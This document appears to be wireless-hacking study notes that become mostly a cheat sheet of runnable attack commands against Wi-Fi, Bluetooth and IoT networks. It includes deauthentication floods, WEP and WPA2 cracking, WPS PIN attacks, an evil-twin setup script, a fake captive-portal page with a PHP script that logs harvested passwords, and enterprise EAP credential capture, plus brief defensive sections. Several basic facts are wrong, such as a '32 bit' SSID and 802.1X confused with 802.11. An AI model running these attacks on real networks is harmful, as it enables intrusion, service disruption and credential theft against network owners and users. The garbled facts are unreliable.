# Terms
	**Wireless network** is a computer network that uses wireless data connection between network nodes.
	**Access Point**: Access Point (AP) or Wireless Access Point (WAP) is a hardware device that allows wireless connectivity to the end devices.
	**Service Set Identifier (SSID)**: A 32 bit identification string of the Access Point, the AP's name. SSID inserted into the header of every data packet.
	**Basic Service Set Identifier (BSSID)**: MAC address of the Access Point.

# Wi-FI
	Wi-Fi is a local area networking technology based on the IEEE 802.11 standard.
	Wi-Fi stands for Wireless-Fidility
	In 1999, Six companies come together and form a global non-profit association, regardless of brand, using a new wireless networking technology.
	In 2000, the group adopted the term **Wi-Fi** for its technical work and announce its official name **Wi-Fi Alliance**.

# Wireless Standards
	**802.1X** is a set of standards that has set of rules which allow wired and wireless peripherals to work with each other. like Mobile with Router, Computer with Router, etc. We have Different Sub-Protocols in 802.11 Family which are categorized as per their Frequency and Modulation technique.

	| Protocol  |  Frequency  | Max Data Speed |
	|:---------:|:-----------:|:--------------:|
	|  802.11a  |    5 GHz    |    54 Mbps	   |
	|  802.11b  |   2.4 GHz   |    11 Mbps     | 		
	|  802.11g  |   2.4 Ghz   |    54 Mbps     |
	|  802.11n  |  2.4/5 Ghz  |    450 Mbps    | -> **Can handle a single device at a time**
	|  802.11ac |    5 Ghz    |    866.7 Mbps  | -> **Can handle 4 devices at a time** --

# Wi-Fi latest version and their speed
	| Protocol | Version |   Speed  |
	|:--------:|:-------:|:--------:|
	| 802.11n  | Wi-Fi 4 | 600 Mb/s | -> **802.11n is renamed as Wi-Fi 4**
	| 802.11ac | Wi-Fi 5 | 3.5 Gb/s | -> **802.11ac is renamed as Wi-fi 5**
	| 802.11ax | Wi-Fi 6 | 9.6 Gb/s | <- **Latest and fastest we can use, can handle 8 devices at a time**

# Authentication Progress
	**Open System Authentication** - In open system Authentication, client sent Authentication request from device that contain the Station ID (Typically the MAC Address). And Receive Authentication Response from AP/Router with a success or Failure message.
	**Shared Key Authentication** - In Shared key Authentication, a shared key, or passphrase, is manually set on both the mobile device and the AP/router for comparison. Authentication depends on match result.

# Wardriving
	Wardriving is the act of searching for Wi-Fi wireless networks by a person usually in a moving vehicle, using a laptop or smartphone.

# Types of Wireless Antennas
	# Directional Antenna
		Direction antennas are designed to function in a specific direction to improve efficiency
		Use case: Dish Antennas
	# Omnidirectional antennas
		Omnidirectional antenna radiates equal radio power in all directions.
		Use cases: radio broadcasting, cell phones, GPS
--------------------------------------------------------------------------------------------------------------
## Wireless Encryption

# Wired Equivalent Privacy (WEP) - 1997
	- Designed to provide the same level of security as that of a wired LAN
	- WEP is Standard protocol before 2004
	- Use Pre-shared Key, and plain text transmission.

# Wi-Fi Protected Access (WPA) - 2003 by Wi-Fi Alliance
	- Used for WLAN network based on 802.11i
	- Use RADIUS (**Remote Authentication Dial-In User Service**) Server
	- Only fesible for Corporate giants who can setup their Server, Not fesible for normal users

# WPA2 - 2004
	- Strong Encryption AES (Advanced Encryption Standard) - 128-256 bit key
	- In WPA2, when user try to connect with AP/Router, key is Encrypted by AES and then transmitted.

# Wireless Threats
	- **Access Control Attacks** : evading access control parameters (MAC spoofing point)
	- **Confidentiality Attacks** : traffic analysis, session hijacking, MITM, etc...
	- **Availability Attacks** : prevent user from accessing the wireless network (flooding, ARP poisoning, De-Authentication attacks)
	- **Authentication Attacks** : steal identity information or impersonating clients (password cracking, password guessing)
	- **Rogue Access Point** : a fake access point in a place with the legitimate one, with the same SSID to monitor victims activity by sniffing packets.
	- **Misconfigured Access Point Attacks** : default or week password, Open Authentication
	- **Jamming Signal Attacks** : jamming or blocking the wireless communication, causing a denial of service
--------------------------------------------------------------------------------------------------------------
# Hacking Methodology

# Wi-Fi Discovery
	- Passive footprinting (sniffing packets)
	- Active footprinting (probing the AP to get information)

# Wireless Traffic Analysis
	- Capture the packets to reveal any information (SSID, authentication method, ...)

# Launch Attacks
	- ARP poisoning - Poisoning the ARP cache of Target machine, so that Attacker AP/Router send Victims Traffic to Attacker.
	- MAC spoofing - Using False MAC Address
  - Attacker Send De-Authentication request with spoofed
	- Rogue access point - Installing Rogue access point in secure network without authorization of network Admin.
	- MITM - Man-In-The-Middle Attacks.

# Wireless Security Tools
	# Wireless Intrusion Prevention System (WIPS)
		- Monitors the wireless network
		- Protect against unauthorized access points
		- Perform automatic intrusion prevention
		- Monitors the radio spectrum to prevents rogue access point and alert the network administrator
		- Can detect AP misconfiguration
		- Detect honeypots
		- Mitigate DoS

	# Wi-Fi Countermeasures
		- Change default parameters
		- Disable remote login to wireless devices
		- Use strong password - use passphrases
		- Use the latest standards (WPA2 AES)
		- MAC filtering
		- Update software often
		- Enable firewall
--------------------------------------------------------------------------------------------------------------
# Aircrack Suite
	- Airmon-ng
	- Airodump-ng
	- Aireplay-ng
	- Aircrack-ng

-> **airmon-ng start <Interface>**																					// Using that interface for network monitoring
-> **airmon-ng check kill**																									// Killing Processes which may cause trouble
-> **airodump-ng <interface>**																							// We need AP/Router MAC Address
-> **airodump-ng -w <file> --bssid <MAC Address> <Interface>**							// Start Capturing packets
-> **aireplay-ng --deauth 0 -a <Access Point BSSID> <interface>**						// We send DE-Authentication packets to Target Access Point
-> **aircrack-ng -w <Wordlist /dir> <Airdump Captured file /dir>**					// This will prompt us for Network Selection. Try to Crack Key with help of Wordlist
--------------------------------------------------------------------------------------------------------------
# WiFiPhisher
	This tool use phishing attack to get WiFi password.
		- https://www.youtube.com/watch?v=8dhGWCfrBc
--------------------------------------------------------------------------------------------------------------

# Advanced Wireless Network Hacking Techniques and Payloads

## Wi-Fi Network Discovery and Reconnaissance

### Passive Wireless Reconnaissance
```bash
# Monitor Mode Setup
airmon-ng check kill                                     # Kill interfering processes
airmon-ng start wlan0                                    # Enable monitor mode
iwconfig wlan0mon mode monitor                          # Verify monitor mode

# Comprehensive Network Discovery
airodump-ng wlan0mon                                     # Scan all channels
airodump-ng -c 6 wlan0mon                               # Scan specific channel
airodump-ng --manufacturer wlan0mon                     # Show device manufacturers
airodump-ng -w scan_results wlan0mon                    # Save results to file

# Kismet Wireless Detection
kismet -c wlan0mon                                       # Advanced wireless scanner
kismet_client --server localhost:2501                   # Connect to Kismet server

# WiFi Analyzer Tools
wavemon                                                  # Console-based WiFi monitor
horst -i wlan0mon                                       # Lightweight WiFi analyzer
```

**Documentation**: Passive wireless network discovery for identifying targets and gathering intelligence.
**Limitations**: Requires compatible wireless hardware; hidden networks may not be detected; limited range.

### Active Wireless Reconnaissance
```bash
# Active Probing
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon  # Fake authentication
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon  # Interactive packet replay

# Client Probing
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon     # Monitor specific AP
airodump-ng -c 6 -w clients --bssid AA:BB:CC:DD:EE:FF wlan0mon  # Capture client traffic

# Hidden SSID Discovery
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon         # Deauth attack to reveal hidden SSID
```

**Documentation**: Active techniques for gathering detailed wireless network information and forcing responses.
**Limitations**: Active scanning is easily detected; may violate local regulations; can disrupt network operations.

## WEP Encryption Attacks

### WEP Key Recovery Attacks
```bash
# WEP Cracking Methodology
# 1. Capture WEP traffic
airodump-ng -c 6 -w wep_capture --bssid AA:BB:CC:DD:EE:FF wlan0mon

# 2. Generate traffic (if network is idle)
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon  # Fake authentication
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon    # ARP replay attack

# 3. Crack WEP key
aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap     # Statistical attack
aircrack-ng -K -b AA:BB:CC:DD:EE:FF wep_capture-01.cap  # KoreK attack

# WEP Cracking with Packet Injection
aireplay-ng -9 -e "WEP_Network" -a AA:BB:CC:DD:EE:FF wlan0mon  # Injection test
aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon  # Interactive packet replay
```

**Documentation**: WEP encryption is fundamentally broken and can be cracked with sufficient IV packets.
**Limitations**: WEP is largely deprecated; requires packet capture; success depends on network traffic.

### WEP Authentication Bypass
```bash
# Shared Key Authentication Attack
aireplay-ng -1 0 -e "WEP_Network" -y sharedkey.xor -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
aireplay-ng -1 6000 -o 1 -q 10 -e "WEP_Network" -y sharedkey.xor -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Extract keystream
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y sharedkey.xor -w inject.cap
```

**Documentation**: Exploits shared key authentication to bypass WEP protection without knowing the key.
**Limitations**: Only works with shared key authentication; requires captured authentication handshake.

## WPA/WPA2 Attacks

### WPA2 Handshake Capture and Cracking
```bash
# WPA2 4-Way Handshake Capture
airodump-ng -c 6 -w wpa2_capture --bssid AA:BB:CC:DD:EE:FF wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon  # Deauth specific client

# Verify handshake capture
aircrack-ng wpa2_capture-01.cap                         # Check for WPA handshake

# Dictionary Attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_capture-01.cap
aircrack-ng -w custom_wordlist.txt -b AA:BB:CC:DD:EE:FF wpa2_capture-01.cap

# GPU-Accelerated Cracking with Hashcat
aircrack-ng wpa2_capture-01.cap -j hashcat_format       # Convert to hashcat format
hashcat -m 2500 hashcat_format.hccapx /usr/share/wordlists/rockyou.txt --force

# Advanced Hashcat Rules
hashcat -m 2500 -r /usr/share/hashcat/rules/best64.rule hashcat_format.hccapx wordlist.txt
hashcat -m 2500 -a 3 hashcat_format.hccapx ?d?d?d?d?d?d?d?d  # Mask attack for numeric passwords
```

**Documentation**: WPA2 handshake capture and offline password cracking using dictionary and brute force attacks.
**Limitations**: Requires strong password list; time-intensive for complex passwords; WPA3 provides better protection.

### WPS (Wi-Fi Protected Setup) Attacks
```bash
# WPS PIN Attack (Reaver)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv             # Basic WPS PIN attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 15 -t 10 -c 6  # With delays and timeouts
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1        # Use small DH keys

# WPS Pixie Dust Attack (Bully)
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon                # WPS PIN attack with bully
bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon        # Verbose pixie dust attack

# WPS Information Gathering
wash -i wlan0mon                                         # Scan for WPS-enabled APs
wpscan -i wlan0mon                                       # Alternative WPS scanner
```

**Documentation**: WPS attacks exploit implementation flaws to recover WPA2 passwords.
**Limitations**: WPS must be enabled; some implementations have rate limiting; modern routers disable WPS.

## Evil Twin and Rogue Access Point Attacks

### Evil Twin Access Point Setup
```bash
# Hostapd Configuration (evil_twin.conf)
interface=wlan1
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP

# DHCP Server Configuration (dnsmasq.conf)
interface=wlan1
dhcp-range=192.168.4.2,192.168.4.30,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1

# Evil Twin Attack Script
#!/bin/bash
# evil_twin_attack.sh

TARGET_SSID="Target_Network"
INTERFACE_MON="wlan0mon"
INTERFACE_AP="wlan1"

# Configure evil twin AP
hostapd evil_twin.conf &
dnsmasq -C dnsmasq.conf -d &

# Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i $INTERFACE_AP -o eth0 -j ACCEPT

# Deauth original network
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF $INTERFACE_MON &

echo "[+] Evil twin attack started"
echo "[+] SSID: $TARGET_SSID"
echo "[+] Monitoring interface: $INTERFACE_MON"
echo "[+] AP interface: $INTERFACE_AP"
```

**Documentation**: Creates rogue access point to capture credentials and perform man-in-the-middle attacks.
**Limitations**: Requires multiple wireless interfaces; easily detected by informed users; illegal in many jurisdictions.

### Captive Portal Attacks
```bash
# WiFiPhisher Attack
wifiphisher -i wlan0 -e "Target_Network" --force-hostapd

# Custom Captive Portal
# Create fake login page (index.html)
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h2>WiFi Authentication Required</h2>
<form action="login.php" method="post">
  Username: <input type="text" name="username"><br>
  Password: <input type="password" name="password"><br>
  <input type="submit" value="Connect">
</form>
</body>
</html>
EOF

# Credential harvesting script (login.php)
cat > /var/www/html/login.php << 'EOF'
<?php
$username = $_POST['username'];
$password = $_POST['password'];
$log = date('Y-m-d H:i:s') . " - $username:$password\n";
file_put_contents('/tmp/credentials.log', $log, FILE_APPEND);
header('Location: https://google.com');
?>
EOF
```

**Documentation**: Captive portal attacks trick users into entering credentials on fake login pages.
**Limitations**: Sophisticated users may detect fake portals; HTTPS certificate warnings alert users.

## WPA3 and Modern Wireless Security

### WPA3 Security Assessment
```bash
# WPA3 Network Detection
airodump-ng wlan0mon | grep -i "WPA3\|SAE"              # Identify WPA3 networks

# Dragonfly Handshake Capture (WPA3-Personal)
airodump-ng -c 6 -w wpa3_capture --bssid AA:BB:CC:DD:EE:FF wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon         # Deauth to capture SAE handshake

# WPA3 Vulnerability Research
# Dragonblood attacks (CVE-2019-13456, CVE-2019-13457)
# Side-channel attacks on SAE protocol
```

**Documentation**: WPA3 provides improved security but may have implementation vulnerabilities.
**Limitations**: WPA3 adoption is limited; sophisticated attacks require specific vulnerabilities; stronger than WPA2.

### Enterprise Wireless Security Testing
```bash
# WPA Enterprise (802.1X) Testing
# RADIUS Server Attacks
python eap_hammer.py -i wlan0mon -e "Enterprise_Network"

# Certificate Validation Bypass
hostapd-eaphammer --cert-wizard                         # Generate fake certificates
eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "Enterprise_Network" --creds

# EAP Method Testing
eapmd5pass -r capture.cap -w wordlist.txt               # EAP-MD5 cracking
asleap -r capture.cap -f wordlist.txt                   # LEAP cracking
```

**Documentation**: Enterprise wireless networks use 802.1X authentication with additional attack vectors.
**Limitations**: Requires certificate validation bypass; modern implementations use strong EAP methods.

## Bluetooth and IoT Wireless Attacks

### Bluetooth Security Testing
```bash
# Bluetooth Device Discovery
hcitool scan                                            # Basic device scan
hcitool inq                                             # Inquiry scan
bluetoothctl scan on                                    # Modern Bluetooth scanning

# Bluetooth Service Discovery
sdptool browse 00:11:22:33:44:55                       # Service discovery
sdptool search --bdaddr 00:11:22:33:44:55 SP           # Search for services

# Bluetooth Attacks
l2ping -c 5 00:11:22:33:44:55                         # L2CAP ping
btscanner -i hci0                                      # Bluetooth scanner
spooftooph -i hci0 -a 00:11:22:33:44:55               # MAC address spoofing

# BlueBorne Attack Framework
python bluebornerepo.py --target 00:11:22:33:44:55     # BlueBorne vulnerability test
```

**Documentation**: Bluetooth security testing for device discovery and vulnerability assessment.
**Limitations**: Short range limitation; modern Bluetooth has better security; requires specific vulnerabilities.

### ZigBee and IoT Wireless Testing
```bash
# ZigBee Network Analysis with KillerBee
zbdump -c 11 -w zigbee_capture.pcap                    # ZigBee packet capture
zbfind                                                  # Find ZigBee networks
zbdsniff -c 11                                         # ZigBee traffic sniffing

# IoT Device Discovery
nmap -sU -p 1900 192.168.1.0/24                       # UPnP device discovery
python iot_scanner.py --scan 192.168.1.0/24           # Custom IoT scanner

# LoRaWAN Security Testing
gr-lora_receive_file.py capture.sigmf                  # LoRa signal analysis
```

**Documentation**: IoT wireless protocol testing for smart home and industrial devices.
**Limitations**: Requires specialized hardware; protocols vary widely; limited attack tools available.

## Wireless Defense and Monitoring

### Wireless Intrusion Detection
```bash
# Kismet IDS Configuration
# kismet.conf
server=tcp:3501:*
allowedhosts=127.0.0.1
source=wlan0:name=Monitor

# Custom Wireless IDS Script
#!/bin/bash
# wireless_ids.sh - Basic wireless intrusion detection

INTERFACE="wlan0mon"
LOG_FILE="/var/log/wireless_ids.log"

while true; do
    # Detect deauth attacks
    DEAUTH=$(timeout 10 airodump-ng $INTERFACE | grep -c "deauth")
    if [ $DEAUTH -gt 5 ]; then
        echo "$(date): Possible deauth attack detected" >> $LOG_FILE
    fi
    
    # Detect new APs
    NEW_APS=$(airodump-ng --write /tmp/scan --output-format csv $INTERFACE &
              sleep 10; kill $!; 
              cat /tmp/scan-01.csv | wc -l)
    
    if [ $NEW_APS -gt 50 ]; then
        echo "$(date): Unusual number of APs detected ($NEW_APS)" >> $LOG_FILE
    fi
    
    sleep 60
done
```

**Documentation**: Wireless intrusion detection for monitoring unauthorized access and attacks.
**Limitations**: High false positive rate; requires tuning for environment; sophisticated attacks may evade detection.

### Wi-Fi Security Hardening
```bash
# Router Security Assessment Script
#!/bin/bash
# wifi_security_audit.sh

TARGET_BSSID="$1"
TARGET_CHANNEL="$2"

echo "[+] WiFi Security Assessment for $TARGET_BSSID"

# Check encryption
echo "[+] Checking encryption..."
airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID wlan0mon --write security_check &
sleep 30
kill $!

# Analyze results
if grep -q "WEP" security_check-01.csv; then
    echo "[!] CRITICAL: WEP encryption detected"
fi

if grep -q "WPS" security_check-01.csv; then
    echo "[!] WARNING: WPS enabled"
fi

if grep -q "OPN" security_check-01.csv; then
    echo "[!] CRITICAL: Open network detected"
fi

# Check for default SSIDs
DEFAULT_SSIDS=("linksys" "default" "netgear" "dlink" "asus")
for ssid in "${DEFAULT_SSIDS[@]}"; do
    if grep -qi "$ssid" security_check-01.csv; then
        echo "[!] WARNING: Default SSID detected: $ssid"
    fi
done

echo "[+] Security assessment complete"
```

**Documentation**: Automated security assessment for identifying common wireless vulnerabilities.
**Limitations**: Cannot detect all misconfigurations; requires manual verification; limited to visible networks.

# Reference URLs and Research Papers:
- IEEE 802.11 Standards: https://standards.ieee.org/standard/802_11-2020.html
- NIST Wireless Security Guide: https://csrc.nist.gov/publications/detail/sp/800-153/final
- WPA3 Specification: https://www.wi-fi.org/download.php?file=/sites/default/files/private/WPA3_Specification_v3.1.pdf
- Aircrack-ng Documentation: https://www.aircrack-ng.org/doku.php
- OWASP Wireless Security: https://owasp.org/www-community/controls/Wireless_Security
- Research Paper: "WPA3 Security Analysis" - https://papers.mathyvanhoef.com/dragonblood.pdf
- Bluetooth Security Guide: https://www.bluetooth.com/learn-about-bluetooth/tech-overview/
- WiFi Security Best Practices: https://www.cisa.gov/sites/default/files/publications/Wireless%20Network%20Security%20-%20508%20compliant.pdf
